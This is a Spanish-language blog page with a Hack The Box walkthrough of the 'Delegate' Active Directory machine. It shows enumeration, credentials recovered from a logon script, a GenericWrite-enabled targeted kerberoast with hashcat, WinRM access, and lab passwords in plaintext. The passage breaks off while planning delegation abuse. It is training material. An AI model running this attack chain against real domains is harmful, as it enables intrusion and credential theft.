@@ -1,0 +1,1374 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../babytwo/">
+      
+      
+        <link rel="next" href="../tombwatcher/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/lucifer.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Delegate - Bitácora de javik</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../estilos/gruvbox.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#maquina-delegate" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../../.." title="Bitácora de javik" class="md-header__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../../assets/lucifer.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Bitácora de javik
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Delegate
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Bitácora de javik" class="md-nav__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../../assets/lucifer.png" alt="logo">
+
+    </a>
+    Bitácora de javik
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 Bitácora de javik
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💀 Máquinas HTB
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💀 Máquinas HTB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../administrator/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Administrator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../babytwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BabyTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Delegate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tombwatcher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TombWatcher
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../escapetwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EscapeTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../breach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Breach
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../media/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Media
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authority/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authority
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../herramientas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛠️ Herramientas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🛠️ Herramientas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/nxc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NetExec (NXC)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/sliver-c2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sliver C2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/seimpersonate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SeImpersonatePrivilege
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/mssql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumeración MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/chisel-pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chisel & Pivoting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../certificaciones/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏆 Certificaciones
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../mis-notas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mis Notas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mis Notas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/configuracion-ad-basico/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuración de AD Básico
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/ataques-adcs-esc1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abuso de AD CS (ESC1)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="maquina-delegate">Máquina: Delegate<a class="headerlink" href="#maquina-delegate" title="Permanent link">&para;</a></h1>
+<ul>
+<li><strong>Sistema Operativo:</strong> Windows</li>
+<li><strong>Dificultad:</strong> Media</li>
+<li><strong>Técnicas clave:</strong> Active Directory, Kerberos Constrained Delegation, MSRPC</li>
+</ul>
+<hr />
+<p><img alt="Pasted image 20260920211737.png" src="../assets/Pasted%20image%2020260920211737.png" /></p>
+<p>fase uno reconocimiento</p>
+<div class="highlight"><pre><span></span><code>sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.234.69 -oN escaneo
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-20 21:19:30Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-09-20T21:19:59+00:00; -5s from scanner time.
+| rdp-ntlm-info:
+|   Target_Name: DELEGATE
+|   NetBIOS_Domain_Name: DELEGATE
+|   NetBIOS_Computer_Name: DC1
+|   DNS_Domain_Name: delegate.vl
+|   DNS_Computer_Name: DC1.delegate.vl
+|   DNS_Tree_Name: delegate.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-09-20T21:19:39+00:00
+| ssl-cert: Subject: commonName=DC1.delegate.vl
+| Not valid before: 2026-09-19T21:16:58
+|_Not valid after:  2027-03-21T21:16:58
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2026-09-20T21:19:40
+|_  start_date: N/A
+|_clock-skew: mean: -5s, deviation: 0s, median: -5s
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.44 seconds
+</code></pre></div>
+<p>nada fuera delo normal en los puertos del nmap así que resolvamos el hosts</p>
+<div class="highlight"><pre><span></span><code>nxc smb 10.129.234.69
+</code></pre></div>
+<p><img alt="Pasted image 20260920212642.png" src="../assets/Pasted%20image%2020260920212642.png" /></p>
+<p>miramos que  guest esta activo</p>
+<div class="highlight"><pre><span></span><code>nxc smb 10.129.234.69 -u 'guest' -p '' --shares
+</code></pre></div>
+<p><img alt="Pasted image 20260920213021.png" src="../assets/Pasted%20image%2020260920213021.png" /></p>
+<p>luego de enumerar por smbclient miramos esto en el SYSVOL</p>
+<div class="highlight"><pre><span></span><code>smbclient //10.129.234.69/SYSVOL -N
+</code></pre></div>
+<p><img alt="Pasted image 20260920213435.png" src="../assets/Pasted%20image%2020260920213435.png" /></p>
+<p>miramos un users.bat en escript y tenia esto</p>
+<p><img alt="Pasted image 20260920213628.png" src="../assets/Pasted%20image%2020260920213628.png" /></p>
+<p>que es esto</p>
+<p>El script es un <strong>logon script</strong> (script de inicio de sesión) de Windows/AD. Se ejecuta automáticamente cada vez que un usuario inicia sesión en el dominio, normalmente porque está asignado como script de logon en el AD (atributo <code>scriptPath</code> del usuario, o vía GPO).</p>
+<p>asi que sabiendo esto miramos que este escript apunta a otro dominio asi que con nxc lo sacamos</p>
+<div class="highlight"><pre><span></span><code>nxc smb 10.129.234.0/24 -u '' -p ''
+</code></pre></div>
+<p><img alt="Pasted image 20260920214814.png" src="../assets/Pasted%20image%2020260920214814.png" /></p>
+<p>también la maquina da una pista al llamarse delegate asi que tenemos otra ip asi que usemos nxc para mirar que tiene</p>
+<div class="highlight"><pre><span></span><code>nxc smb 10.129.234.50
+</code></pre></div>
+<p><img alt="Pasted image 20260920215937.png" src="../assets/Pasted%20image%2020260920215937.png" /></p>
+<p>ya con esto podemos hacer otro escaneo con nmap para mirar que tiene </p>
+<div class="highlight"><pre><span></span><code>sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.234.50 -oN escaneodc2
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 10-20-24  01:11AM                  434 CyberAudit.txt
+| 10-20-24  05:14AM                 2622 Shared.kdbx
+|_10-20-24  01:26AM                  580 TrainingAgenda.txt
+| ftp-syst:
+|_  SYST: Windows_NT
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-20 22:02:55Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info:
+|   10.129.234.50:1433:
+|     Target_Name: REDELEGATE
+|     NetBIOS_Domain_Name: REDELEGATE
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: redelegate.vl
+|     DNS_Computer_Name: dc.redelegate.vl
+|     DNS_Tree_Name: redelegate.vl
+|_    Product_Version: 10.0.20348
+|_ssl-date: 2026-09-20T22:03:13+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-09-20T13:32:24
+|_Not valid after:  2056-09-20T13:32:24
+| ms-sql-info:
+|   10.129.234.50:1433:
+|     Version:
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=dc.redelegate.vl
+| Not valid before: 2026-09-19T13:30:02
+|_Not valid after:  2027-03-21T13:30:02
+|_ssl-date: 2026-09-20T22:03:13+00:00; 0s from scanner time.
+| rdp-ntlm-info:
+|   Target_Name: REDELEGATE
+|   NetBIOS_Domain_Name: REDELEGATE
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: redelegate.vl
+|   DNS_Computer_Name: dc.redelegate.vl
+|   DNS_Tree_Name: redelegate.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-09-20T22:03:04+00:00
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2026-09-20T22:03:05
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+</code></pre></div>
+<p>a anumerar la web no tiene nada importante</p>
+<p><img alt="Pasted image 20260920220623.png" src="../assets/Pasted%20image%2020260920220623.png" /></p>
+<p>miramos el ftp y nos da esto el ftp estaba con login Anonymous</p>
+<p><img alt="Pasted image 20260920220959.png" src="../assets/Pasted%20image%2020260920220959.png" /></p>
+<p>nos descargamos esos archivos para mirarlos dos archivos muestran esto el otro esta encodeado
+<img alt="Pasted image 20260920221451.png" src="../assets/Pasted%20image%2020260920221451.png" /></p>
+<p>al español dice esto</p>
+<div class="highlight"><pre><span></span><code>HALLAZGOS DE LA AUDITORÍA DE OCTUBRE DE 2024
+
+[!] Hallazgos de la auditoría de ciberseguridad:
+
+1) Contraseñas de usuario débiles
+2) Privilegios excesivos asignados a los usuarios
+3) Objetos de Active Directory sin uso
+4) ACL (Listas de control de acceso) peligrosas en Active Directory
+
+[*] Medidas correctivas:
+
+1) Solicitar a los usuarios que cambien sus contraseñas: COMPLETADO
+2) Revisar los privilegios de todos los usuarios y eliminar los privilegios elevados: COMPLETADO
+3) Eliminar objetos sin uso en el dominio: EN PROCESO
+4) Revisar nuevamente las ACL: EN PROCESO
+AGENDA DE CAPACITACIÓN EN CIBERSEGURIDAD PARA EMPLEADOS (OCTUBRE DE 2024)
+
+Viernes 4 de octubre | 14:30 - 16:30 - 53 asistentes
+"No muerdas el anzuelo": Cómo identificar mejor los correos de *phishing* y qué hacer al recibir uno
+
+
+Viernes 11 de octubre | 15:30 - 17:30 - 61 asistentes
+"Las redes sociales y sus peligros": ¿Qué sucede con lo que publicas en línea?
+
+
+Viernes 18 de octubre | 11:30 - 13:30 - 7 asistentes
+"Contraseñas débiles": Por qué "SeasonYear!" no es una buena contraseña
+
+
+Viernes 25 de octubre | 9:30 - 12:30 - 29 asistentes
+</code></pre></div>
+<p>esto párese ser que  ala empresa le isieron una auditoria y les dejaron estos mensajes asi que tenemos esta pass mas la del user administrator tambien miramos este archivo que es un .kdbx que es esto:</p>
+<p>Los archivos <strong>.kdbx</strong> son bases de datos de contraseñas encriptadas creadas por <strong>KeePass Password Safe</strong>.  Este formato es utilizado principalmente por la versión 2 de KeePass y aplicaciones compatibles como <strong>KeePassXC</strong>, <strong>KeePassDX</strong> y <strong>KeePassium</strong>.</p>
+<p>asi que con jhon lo podemos romper</p>
+<p>https://avantguard.io/en/blog/attacking-and-hardening-keepass</p>
+<p>sacamos el hash</p>
+<div class="highlight"><pre><span></span><code>keepass2john Shared.kdbx &gt; hash.txt
+</code></pre></div>
+<p><img alt="Pasted image 20260920223848.png" src="../assets/Pasted%20image%2020260920223848.png" /></p>
+<p>para empesar podemos armar un word list chico pero por qui por el momento noba</p>
+<p>pero si nos acordamos en el archivo que tenemos donde esta administrator esta otro user llamado A.Briggs asi que podemos probar la pass con el </p>
+<div class="highlight"><pre><span></span><code>nxc smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'
+</code></pre></div>
+<p><img alt="Pasted image 20260920225956.png" src="../assets/Pasted%20image%2020260920225956.png" /></p>
+<p>funciona asi que nos descargamos todos los objetos del ad para enumerar con el blood</p>
+<div class="highlight"><pre><span></span><code>bloodhound-ce-python -u 'A.Briggs' -p 'P4ssw0rd1#123' -d delegate.vl -dc DC1.delegate.vl -ns 10.129.234.69 -c All --zip
+</code></pre></div>
+<p>luego miramos esto</p>
+<p><img alt="Pasted image 20260920230924.png" src="../assets/Pasted%20image%2020260920230924.png" /></p>
+<p>nuestro usuario A.Briggs tiene la acl de  GenericWrite sobre el usuario N.THOMPSON</p>
+<p>https://www.hackingarticles.in/genericwrite-active-directory-abuse/</p>
+<p>asi que le agregamos un spn</p>
+<div class="highlight"><pre><span></span><code>bloodyAD -H 10.129.234.69 -d DELEGATE.VL -u 'A.BRIGGS' -p 'P4ssw0rd1#123' set object N.THOMPSON servicePrincipalName -v 'HTTP/nthompson'
+</code></pre></div>
+<p>luego con nxc pedimos el tgs y los rompemos con hascat o jonh</p>
+<div class="highlight"><pre><span></span><code>nxc ldap 10.129.234.69 -u 'A.BRIGGS' -p 'P4ssw0rd1#123' -d DELEGATE.VL --kerberoasting kerberoast.txt
+</code></pre></div>
+<p><img alt="Pasted image 20260920234406.png" src="../assets/Pasted%20image%2020260920234406.png" /></p>
+<p>con hascat lo rompemos</p>
+<div class="highlight"><pre><span></span><code>hashcat -m 13100 kerberoast.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></div>
+<p><img alt="Pasted image 20260920234708.png" src="../assets/Pasted%20image%2020260920234708.png" /></p>
+<p>la pass es KALEB_2341 asi que probamos</p>
+<p><img alt="Pasted image 20260920234815.png" src="../assets/Pasted%20image%2020260920234815.png" /></p>
+<p>ya con esto descargamos los objetos del ad con este mismo usuario</p>
+<div class="highlight"><pre><span></span><code>bloodhound-ce-python -u A.Briggs -p 'P4ssw0rd1#123' -d delegate.vl -c all --zip -ns 10.129.234.69
+</code></pre></div>
+<p>también miramos esto</p>
+<p><img alt="Pasted image 20260921002141.png" src="../assets/Pasted%20image%2020260921002141.png" /></p>
+<p>ya mirando estos grupos nos conectamos por winrm y sacamos user.txt</p>
+<div class="highlight"><pre><span></span><code>evil-winrm -i 10.129.234.69 -u 'N.THOMPSON' -p 'KALEB_2341'
+</code></pre></div>
+<p><img alt="Pasted image 20260921002610.png" src="../assets/Pasted%20image%2020260921002610.png" /></p>
+<div class="highlight"><pre><span></span><code>820dad0cc34bdd49b4152a238e4e369b
+</code></pre></div>
+<p>luego miramos los privilegios de nuestro usuario</p>
+<div class="highlight"><pre><span></span><code>whoami /priv
+</code></pre></div>
+<p><img alt="Pasted image 20260921002915.png" src="../assets/Pasted%20image%2020260921002915.png" /></p>
+<p>Al examinar los privilegios asignados a la cuenta de usuario N.Thompson, observamos que tiene asignados <code>SeMachineAccountPrivilege</code> y <code>SeEnableDelegationPrivilege</code>. El privilegio <code>SeMachineAccountPrivilege</code> es un privilegio predeterminado que permite a cada usuario agregar hasta 10 cuentas de equipo. Por su parte, <code>SeEnableDelegationPrivilege</code> es un privilegio sensible que permite a la cuenta de usuario modificar el indicador <code>UserAccountControl</code> (específicamente, <code>TRUSTED_FOR_DELEGATION</code>) de cualquier objeto de usuario o equipo.</p>
+<p>en tonses el plan de ataque clásico seria este</p>
+<ul>
+<li>Crea una cuenta de máquina nueva (usando tu <code>SeMachineAccountPrivilege</code>)</li>
+<li>Márcala como <em>trusted for unconstrained delegation</em> (usando tu <code>SeEnableDelegationPrivilege</code>)</li>
